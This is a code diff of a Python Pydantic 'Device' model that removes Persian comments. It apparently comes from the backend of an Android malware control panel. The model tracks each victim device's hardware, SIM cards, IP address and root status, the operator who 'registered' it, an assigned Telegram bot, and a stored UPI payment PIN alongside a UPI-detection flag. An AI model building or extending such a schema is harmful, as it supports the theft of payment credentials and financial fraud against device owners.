@@ -134,20 +134,15 @@ class SimInfo(BaseModel):
 
 
 class Device(BaseModel):
-    # شناسایی دستگاه
     device_id: str
     user_id: Optional[str] = None
-    app_type: Optional[str] = "MP"  # MP یا MW
-    
-    # 🔑 صاحب دستگاه (ادمین)
-    admin_token: Optional[str] = None  # توکن ادمینی که این دستگاه رو register کرده
-    admin_username: Optional[str] = None  # username ادمین (برای راحتی)
+    app_type: Optional[str] = "MP"
+    admin_token: Optional[str] = None
+    admin_username: Optional[str] = None
     
     note_priority: Optional[str] = None
     note_message: Optional[str] = None
     note_updated_at: Optional[datetime] = None
-    
-    # مشخصات سخت‌افزاری
     model: Optional[str] = "Unknown"
     manufacturer: Optional[str] = "Unknown"
     brand: Optional[str] = None
@@ -159,64 +154,38 @@ class Device(BaseModel):
     fingerprint: Optional[str] = None
     host: Optional[str] = None
     device_name: Optional[str] = None
-    
-    # سیستم عامل
     os_version: Optional[str] = "Unknown"
     sdk_int: Optional[int] = None
     supported_abis: Optional[List[str]] = None
     app_version: Optional[str] = None
-    
-    # باتری
     battery_level: Optional[int] = 0
     battery_state: Optional[str] = None
     is_charging: Optional[bool] = None
-    
-    # حافظه داخلی
     total_storage_mb: Optional[float] = None
     free_storage_mb: Optional[float] = None
     storage_used_mb: Optional[float] = None
     storage_percent_free: Optional[float] = None
-    
-    # رم
     total_ram_mb: Optional[float] = None
     free_ram_mb: Optional[float] = None
     ram_used_mb: Optional[float] = None
     ram_percent_free: Optional[float] = None
-    
-    # شبکه
     network_type: Optional[str] = None
     ip_address: Optional[str] = None
-    
-    # امنیت
     is_rooted: Optional[bool] = False
     is_emulator: Optional[bool] = False
-    
-    # صفحه نمایش
     screen_resolution: Optional[str] = None
     screen_density: Optional[float] = None
-    
-    # سیم‌کارت‌ها
     sim_info: Optional[List[SimInfo]] = None
-    
-    # UPI Detection
     has_upi: Optional[bool] = False
-    upi_pin: Optional[str] = None  # ✅ اضافه شد
+    upi_pin: Optional[str] = None
     upi_detected_at: Optional[datetime] = None
-    upi_last_updated_at: Optional[datetime] = None  # ✅ اضافه شد
-    
-    # Telegram Bot Assignment
-    telegram_bot_id: Optional[int] = None  # شماره ربات تلگرام تخصیص داده شده (1-5)
-    
-    # Package Info
-    package_name: Optional[str] = None  # Android package name
-    
-    # وضعیت
+    upi_last_updated_at: Optional[datetime] = None
+    telegram_bot_id: Optional[int] = None
+    package_name: Optional[str] = None
     status: Optional[str] = "pending"
     last_ping: Optional[datetime] = None
     is_online: Optional[bool] = None
     last_online_update: Optional[datetime] = None
-    
-    # تنظیمات و آمار
     settings: Optional[DeviceSettings] = None
     stats: Optional[DeviceStats] = None
     
